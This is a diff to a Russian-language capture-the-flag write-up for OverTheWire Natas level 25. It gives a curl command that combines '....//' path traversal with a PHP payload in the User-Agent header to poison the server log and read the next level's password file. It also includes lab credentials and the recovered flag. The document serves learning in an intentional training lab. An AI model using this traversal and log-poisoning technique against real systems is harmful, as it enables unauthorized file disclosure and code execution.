@@ -30,14 +30,14 @@ created: 2026-04-08
 | curl  http://natas25.natas.labs.overthewire.org/?lang=....//logs/natas25_nbul92r331p7ahe51mvv9248fq.log | заход на сайт по пути к логам          |
 | -u "natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws"                                                           | авторизация                            |
 | -H "Cookie: PHPSESSID=nbul92r331p7ahe51mvv9248fq"                                                       | Подставка куки под путь к файлу лога   |
-| -H "User-Agent: `<?php '/etc/natas_webpass/natas26'); ?>`"                                              | Передача в User_Agent пароля к натас26 |
+| -H "User-Agent: `<?php include('/etc/natas_webpass/natas26'); ?>`"                                      | Передача в User_Agent пароля к натас26 |
 
 ## 💡 Пошаговое решение
 | Шаг | Действие                                                                                       | Команда/Код                                                                                       |
 | --- | ---------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------- |
 | 1   | Обнаружить каким образом работает path traversal                                               | ....//                                                                                            |
 | 2   | Получить возможность читать логи                                                               | http://natas25.natas.labs.overthewire.org/?lang=....//logs/natas25_nbul92r331p7ahe51mvv9248fq.log |
-| 3   | Зайдя в логи видим, что они передают в них User-Agent, заменяем его на код для считывание кода | User-Agent: <?php include('/etc/natas_webpass/natas26'); ?>                                       |
+| 3   | Зайдя в логи видим, что они передают в них User-Agent, заменяем его на код для считывание кода | User-Agent: `<?php include('/etc/natas_webpass/natas26'); ?>`                                     |
 
 ## 🔍 Результат
 Флаг/Пароль: cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
